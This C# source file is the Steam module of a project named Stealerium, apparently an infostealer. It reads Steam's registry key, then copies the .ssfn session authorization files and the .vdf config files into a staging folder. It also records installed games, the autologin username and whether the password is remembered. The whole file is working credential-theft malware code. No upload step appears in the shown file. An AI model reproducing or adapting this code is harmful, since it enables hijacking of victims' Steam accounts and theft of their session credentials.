using System;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming
{
    internal sealed class Steam
    {
        public static bool GetSteamSession(string sSavePath)
        {
            var rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
            if (rkSteam == null)
                return Logging.Log("Steam >> Application path not found in registry", false);

            var sSteamPath = rkSteam.GetValue("SteamPath").ToString();
            if (!Directory.Exists(sSteamPath))
                return Logging.Log("Steam >> Application directory not found", false);

            Directory.CreateDirectory(sSavePath);

            try
            {
                // Get steam applications list
                foreach (var gameId in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
                    using (var app = rkSteam.OpenSubKey("Apps\\" + gameId))
                    {
                        if (app == null) continue;
                        var name = (string) app.GetValue("Name");
                        name = string.IsNullOrEmpty(name) ? "Unknown" : name;
                        var installed = (int) app.GetValue("Installed") == 1 ? "Yes" : "No";
                        var running = (int) app.GetValue("Running") == 1 ? "Yes" : "No";
                        var updating = (int) app.GetValue("Updating") == 1 ? "Yes" : "No";

                        File.AppendAllText(sSavePath + "\\Apps.txt",
                            $"Application {name}\n\tGameID: {gameId}\n\tInstalled: {installed}\n\tRunning: {running}\n\tUpdating: {updating}\n\n");
                    }
            }
            catch (Exception ex)
            {
                Logging.Log("Steam >> Failed collect steam apps\n" + ex);
            }

            try
            {
                // Copy .ssfn files
                if (Directory.Exists(sSteamPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\ssnf");
                    foreach (var file in Directory.GetFiles(sSteamPath))
                        if (file.Contains("ssfn"))
                            File.Copy(file, sSavePath + "\\ssnf\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Steam >> Failed collect steam .ssnf files\n" + ex);
            }

            try
            {
                // Copy .vdf files
                var configPath = Path.Combine(sSteamPath, "config");
                if (Directory.Exists(configPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\configs");
                    foreach (var file in Directory.GetFiles(configPath))
                        if (file.EndsWith("vdf"))
                            File.Copy(file, sSavePath + "\\configs\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Steam >> Failed collect steam configs\n" + ex);
            }

            try
            {
                var rememberPassword = (int) rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                var sSteamInfo = string.Format(
                    "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                    "\nRemember password: " + rememberPassword
                );
                File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
            }
            catch (Exception ex)
            {
                Logging.Log("Steam >> Failed collect steam info\n" + ex);
            }

            Counter.Steam = true;
            return true;
        }
    }
}